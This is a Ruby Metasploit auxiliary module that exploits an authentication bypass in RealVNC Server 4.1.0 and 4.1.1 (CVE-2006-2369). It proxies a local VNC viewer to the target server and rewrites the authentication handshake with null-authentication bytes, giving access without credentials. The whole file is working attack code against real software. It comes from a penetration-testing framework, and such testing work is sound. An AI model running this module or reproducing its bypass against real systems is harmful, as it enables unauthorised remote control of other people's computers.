##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary
	include Msf::Exploit::Remote::Tcp
	
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'RealVNC Authentication Bypass',
			'Description'    => %q{
				This module exploits an Authentication Bypass Vulnerability
				in RealVNC Server version 4.1.0 and 4.1.1. It sets up a proxy
				listener on LPORT and proxies to the target server

				The AUTOVNC option requires that vncviewer be installed on 
				the attacking machine. This option should be disabled for Pro
			},
			'Author'         => 
				[
					'hdm', #original msf2 module
					'TheLightCosine <thelightcosine[at]gmail.com>'
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					['BID', '17978'],
					['OSVDB', '25479'],
					['URL', 'http://secunia.com/advisories/20107/'],
					['CVE', '2006-2369'],
				],
			'DisclosureDate' => 'May 15 2006'))

		register_options(
			[
				OptAddress.new('RHOST', [true, 'The Target Host']),
				OptPort.new('RPORT',    [true, "The port the target VNC Server is listening on", 5900 ]),
				OptPort.new('LPORT',    [true, "The port the local VNC Proxy should listen on", 5900 ]),
				OptBool.new('AUTOVNC',  [true, "Automatically Launch vncviewer from this host", true])
			], self.class)
	end

	def run
		#starts up the Listener Server
		print_status("starting listener")
		listener = Rex::Socket::TcpServer.create(
				'LocalHost' => '0.0.0.0',
				'LocalPort' => datastore['LPORT'],
				'Context'   => { 'Msf' => framework, 'MsfExploit' => self }
			)

		#If the autovnc option is set to true this will spawn a vncviewer on the lcoal machine
		#targetting the proxy listener.
		if (datastore['AUTOVNC'])
			unless (check_vncviewer())
				print_error("vncviewer does not appear to be installed, exiting!!!")
				return nil
			end
			print_status("Spawning viewer thread")	
			view = framework.threads.spawn("VncViewerWrapper", false) {
					system("vncviewer 127.0.0.1::#{datastore['LPORT']}")
			}
		end

		#Establishes the connection between the viewier and the remote server
		client = listener.accept
		add_socket(client)

		s = Rex::Socket::Tcp.create(
				'PeerHost' => datastore['RHOST'],
				'PeerPort' => datastore['RPORT'],
				'Timeout' => 1
				)
		add_socket(s)
		serverhello = s.gets
		unless serverhello.include? "RFB 003.008"
			print_error("The VNCServer is not vulnerable")
			return
		end

		#MitM attack on the VNC Authentication Process
		client.puts(serverhello)
		clienthello = client.gets
		s.puts(clienthello)
		authmethods = s.recv(2)
		print_status("Auth Methods Recieved. Sending Null Authentication Option to Client")
		client.write("\x01\x01")
		client.recv(1)
		s.write("\x01")
		s.recv(4)
		client.write("\x00\x00\x00\x00")

		#handles remaining proxy operations between the two sockets
		closed = false
		while(closed == false)
			sockets =[]
			sockets << client
			sockets << s
			selected = select(sockets,nil,nil,0)
			#print_status ("Selected: #{selected.inspect}")
			unless selected.nil?
				if selected[0].include?(client)
					#print_status("Transfering from client to server")
					begin
						data = client.sysread(8192)
						if data.nil?
							print_error("Client Closed Connection")
							closed = true
						else
							s.write(data)
						end
					rescue
						print_error("Client Closed Connection")	
						closed = true
					end
				end
				if selected[0].include?(s)
					#print_status("Transfering from server to client")
					begin
						data = s.sysread(8192)
						if data.nil?
							print_error("Server Closed Connection")
							closed = true
						else
							client.write(data)
						end
					rescue
						closed = true
					end
				end
			end
		end

		#Garbage Collection
		s.close
		client.close
		print_status("Listener Closed")

		if (datastore['AUTOVNC'])
			view.kill
			print_status("Viewer Closed")
		end
	end

	def check_vncviewer
		vnc =
			Rex::FileUtils::find_full_path('vncviewer') ||
			Rex::FileUtils::find_full_path('vncviewer.exe')
		if (vnc)
			return true
		else
			return false
		end
	end
end
